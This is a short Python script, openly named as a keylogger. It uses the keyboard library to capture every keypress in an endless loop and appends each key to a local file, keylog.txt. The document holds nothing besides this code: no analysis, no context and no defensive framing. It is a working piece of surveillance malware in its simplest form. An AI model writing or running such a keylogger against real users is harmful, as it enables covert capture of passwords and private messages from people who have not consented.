import keyboard
import time

log_file = "keylog.txt"

def keylogger():
    with open(log_file, "a") as f:
        while True:
            key = keyboard.read_key()
            if key is not None:
                f.write(key)
            time.sleep(0.1)

if __name__ == "__main__":
    keylogger()